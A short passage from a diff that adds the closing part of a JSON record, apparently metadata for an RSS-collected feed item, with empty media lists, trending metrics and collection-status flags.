+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    }
+  ]
 }
